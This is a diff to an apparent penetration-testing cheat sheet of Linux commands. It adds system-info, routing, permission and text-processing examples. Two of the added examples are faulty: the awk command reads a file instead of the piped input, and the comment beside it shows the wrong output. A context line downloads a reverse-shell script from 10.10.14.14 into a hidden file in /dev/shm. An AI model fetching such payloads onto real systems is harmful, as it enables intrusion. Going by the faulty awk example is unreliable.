@@ -26,8 +26,13 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 ```bash
 # Current user info
 id
-uname -a  # Kernel version
 echo $PATH  # Path
+
+# System Info:
+uname -a         # Show system info + kernal version
+uptime           # Show system uptime
+free -h          # Show memory usage
+df -h            # Show disk space
 
 # Network
 ifconfig
@@ -41,6 +46,7 @@ ss -tulnp # list the open ports
 ss -twurp  # List the live processes & ports
 lsof  # List the live processes & ports
 ip route  # Displays current routing table
+sudo ip route add <destination_network> via <gateway> dev <interface> # sudo ip route add 192.168.1.0/24 via 192.168.0.1 dev eth0
 sudo ip addr add 192.168.1.100/24 dev eth0  # Assigns a static IP
 sudo ip route add default via 192.168.1.1  # Sets the default gateway
 traceroute 8.8.8.8  # Shows the route taken to reach the destination
@@ -96,10 +102,15 @@ find -perm 2 -type f 2> /dev/null  # Find read-writable files
 
 # chnge the file permissions 
 chmod +x <file>
-
+# u-> owner, g->group , others -> o
+chmod u=rwx,g=rx,o=r <file>  # Set specific permissions 
 chown root /u        Change the owner of /u to "root".
 chown root:staff /u  Likewise, but also change its group to "staff".
 
+# Check if a file is immutable
+lsattr suid.sh  # If 'i' appears, the file is immutable
+# Check if /tmp has the sticky bit set
+ls -ld /tmp  # If the last character is 't', only owners can modify their files
 
 # Configuration files
 ls -al /etc/*.conf  # List all conf files in /etc
@@ -171,6 +182,8 @@ cat file | sort | uniq #Sort and delete duplicates
 cat file | sort | uniq -u # sort and displays the lines that appear once
 #Replace in file
 sed -i 's/OLD/NEW/g' path/file #Replace string inside a file
+echo "mido ahmed rawen 2002" | awk '{print $1}' log.txt # rawen
+echo "hate rawen : love rawen" | cut -f 2 -d ":" # love rawen
 
 #Download in RAM
 wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
